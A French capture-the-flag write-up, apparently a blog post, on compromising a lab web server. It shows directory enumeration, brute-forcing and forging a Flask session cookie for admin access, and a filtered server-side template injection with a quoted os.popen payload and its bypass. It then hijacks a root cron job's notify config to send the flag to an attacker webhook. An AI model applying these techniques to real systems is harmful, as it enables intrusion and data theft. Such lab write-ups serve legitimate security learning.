by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8181/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/28 14:35:02 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 711]
/signup               (Status: 200) [Size: 764]
/logout               (Status: 302) [Size: 248] [--&gt; http://172.17.0.2:8181/login?next=%2Flogout]
/scan                 (Status: 200) [Size: 40]
</code></pre><p>On remarque aussi que <strong>/scan</strong> existe, elle est pour le moment inaccessible.
Une page d&rsquo;inscription est disponible, on peut alors essayer de s&rsquo;inscrire.</p>
<p><img src="/posts/bgk/register.png" alt="form"></p>
<p>Une fois authentifié sur le site on essaye de se rendre sur la page de scan, toujours inaccessible.
On remarque alors que notre cookie de session est un cookie flask.</p>
<p><img src="/posts/bgk/console.png" alt="form"></p>
<p>On peut alors essayer de decoder le cookie avec <strong>flask-unsign</strong>.</p>
<p><img src="/posts/bgk/flask-decode.png" alt="form"></p>
<p>Essayons maintenant de bruteforcer la clé permettant de signer le cookie.</p>
<p><img src="/posts/bgk/secret.png" alt="form"></p>
<p>Bingo ! on obtient la secret key : <strong>coldwar</strong>.</p>
<p>On peut maintenant modifier le champ user_id de notre cookie pour lui attribuer la valeur <strong>1</strong>.</p>
<p><img src="/posts/bgk/cookiesign.png" alt="form"></p>
<p>Nous pouvons maintenant utiliser le cookie pour obtenir une session <strong>admin</strong> et accéder à la page /scan.</p>
<p><img src="/posts/bgk/admin.png" alt="form"></p>
<h2 id="step-2--exploitation-dune-server-side-template-injection">Step 2 : Exploitation d&rsquo;une Server Side Template Injection</h2>
<p>Sur la page de scan nous trouvons une input demandant une url.
On lance notre serveur web et on rentre notre url.</p>
<p><img src="/posts/bgk/scan.png" alt="form"></p>
<p>Le web serveur fait plusieurs requêtes sur notre serveur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">spawnzii@spz:/var/www/html$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] code 404, message File not found
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET /robots.txt HTTP/1.1&#34; 404 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -

</code></pre></div><p>Nous avons certaines informations en retour, comme le titre, le robots.txt,les fichiers js &hellip;</p>
<p><img src="/posts/bgk/reponse.png" alt="form"></p>
<p>On peut essayer de modifier le titre de notre serveur web en plaçant par exemple <strong>{{7*7}}</strong>.
<img src="/posts/bgk/testssti.png" alt="form"></p>
<p>Le titre est filtré, nous obtenons <strong>{7*7}</strong>.</p>
<p><img src="/posts/bgk/filter1.png" alt="form"></p>
<p>Il est possible de bypass le filtre avec <strong>{{{7*7}}}</strong>
<img src="/posts/bgk/49.png" alt="form"></p>
<p>On essaye la fameuse payload : <code>{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></p>
<p>Ehhh bah non.
<img src="/posts/bgk/mm.png" alt="form"></p>
<p>Il reste donc encore quelques filtres à bypass.
Pour trouver quels caractères sont filtrés on passe **{{import os global[]'.()&quot;_ }}** en titre.</p>
<p>On obtient <code>заглавие : {import os global'()&quot; }</code>. Les
caratères <strong>[]._</strong> sont donc ﬁltrés</p>
<p>Notre payload final :</p>
<p><img src="/posts/bgk/PLD.png" alt="form"></p>
<p>On a bien notre reverse shell.</p>
<p><img src="/posts/bgk/shell.png" alt="form"></p>
<h2 id="step-2--crontab--notify-for-the-win">Step 2 : Crontab &amp; notify for the win</h2>
<p>Après énumération du serveur on remarque :</p>
<ul>
<li>/root/.config/notify est accessible en lecture et écriture.</li>
<li>/etc/cron.d/job-cron inaccessible en lecture.</li>
</ul>
<p>Ne pouvant pas accéder au crontab il nous faut trouver un moyen de voir ce qu&rsquo;il se passe sur la machine.
Nous pouvons utiliser <strong><a href="https://github.com/DominicBreuker/pspy">pspy</a></strong> pour voir les processus en cours d&rsquo;executions.</p>
<p><img src="/posts/bgk/cron.png" alt="form"></p>
<p>Voilà on recupère le crontab :).
On comprend que le flag est pipe vers notify.</p>
<p>Après quelques recherches on trouve le repo <strong><a href="https://github.com/projectdiscovery/notify">github</a></strong> de notify. Ce tool permet de transmettre le résultat d&rsquo;une commande sur différentes plateformes tel que discord, telegram &hellip;</p>
<p>Il ne nous reste plus qu'à configurer notre provider-config.yaml avec notre webhook discord, situé dans <strong>/root/.config/notify</strong>.</p>
<p><img src="/posts/bgk/provider.png" alt="form"></p>
<p>On attend que le crontab soit exécuté.</p>
<p><img src="/posts/bgk/flag.png" alt="form"></p>
]]></content>
        </item>
        
    </channel>
</rss>
